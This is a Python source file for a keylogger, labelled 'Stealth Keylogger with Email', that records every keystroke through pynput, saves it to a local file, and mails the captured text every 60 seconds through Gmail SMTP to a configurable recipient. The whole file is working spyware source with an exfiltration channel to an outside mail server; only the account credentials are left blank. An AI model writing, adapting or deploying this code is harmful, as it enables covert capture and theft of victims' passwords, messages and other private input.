from pynput.keyboard import Listener, Key
import smtplib
import time
import threading
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
import os

keystrokes = ""
char_count = 0
log_file = "keystrokes.txt"
EMAIL_INTERVAL = 60  # Send email every 60 seconds
last_email_time = 0

# UPDATE THESE - Critical for email to work!
SMTP_SERVER = "smtp.gmail.com"
SMTP_PORT = 587
EMAIL_ADDRESS = "test@gmail.com"  # Your Gmail
EMAIL_PASSWORD = ""    # Gmail App Password (NOT regular password)
TARGET_EMAIL = "test@gmail.com"     # Where to send logs

def send_email(subject, body):
    global keystrokes
    
    try:
        msg = MIMEMultipart()
        msg['From'] = EMAIL_ADDRESS
        msg['To'] = TARGET_EMAIL
        msg['Subject'] = subject
        
        # Limit body size for email
        recent_log = keystrokes[-1000:] if len(keystrokes) > 1000 else keystrokes
        body_text = f"Keystrokes captured: {char_count}\n\n{body}\n\nFull recent log:\n{recent_log}"
        msg.attach(MIMEText(body_text, 'plain'))
        
        server = smtplib.SMTP(SMTP_SERVER, SMTP_PORT)
        server.starttls()
        server.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
        text = msg.as_string()
        server.sendmail(EMAIL_ADDRESS, TARGET_EMAIL, text)
        server.quit()
        
        print(f"[+] Email sent successfully - {len(body)} chars")
        return True
        
    except Exception as e:
        print(f"[-] Email failed: {str(e)}")
        return False

def email_worker():
    global char_count, last_email_time
    
    while True:
        try:
            time.sleep(EMAIL_INTERVAL)
            current_time = time.time()
            
            if char_count > 5 and (current_time - last_email_time) >= EMAIL_INTERVAL:
                summary = keystrokes[-200:]
                if send_email(f"Keylog Report [{char_count} chars]", summary):
                    last_email_time = current_time
        except:
            pass

def on_press(key):
    global keystrokes, char_count
    
    try:
        key_str = str(key).replace("'", "")
        
        if key_str == 'Key.space':
            key_str = ' '
        elif key_str == 'Key.enter':
            key_str = '\n'
        elif key_str == 'Key.shift' or key_str == 'Key.ctrl_l' or key_str == 'Key.ctrl_r':
            key_str = ''
        elif key_str == 'Key.backspace':
            key_str = '[BACK]'
        elif key_str.startswith('Key.'):
            key_str = f'[{key_str}]'
        elif len(key_str) == 1:
            key_str = key_str.lower()
        else:
            key_str = ''
        
        if key_str:
            keystrokes += key_str
            char_count += 1
            
            # Write to file
            try:
                with open(log_file, "a", encoding='utf-8') as f:
                    f.write(key_str)
            except:
                pass
                
    except:
        pass

def on_release(key):
    try:
        if key == Key.esc:
            print("\nStopping... Sending final report...")
            if char_count > 0:
                send_email("FINAL Keylogger Report", keystrokes[-500:])
            return False
    except:
        pass

if __name__ == "__main__":
    print("=== Stealth Keylogger with Email ===")
    print(f"Log file: {log_file}")
    print(f"Email interval: {EMAIL_INTERVAL}s")
    print("Press ESC to stop")
    print("-" * 40)
    
    # Clear old log
    if os.path.exists(log_file):
        os.remove(log_file)
    
    # Start email thread
    email_thread = threading.Thread(target=email_worker, daemon=True)
    email_thread.start()
    
    # Start listener
    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()
    
    print("Keylogger stopped.")
```
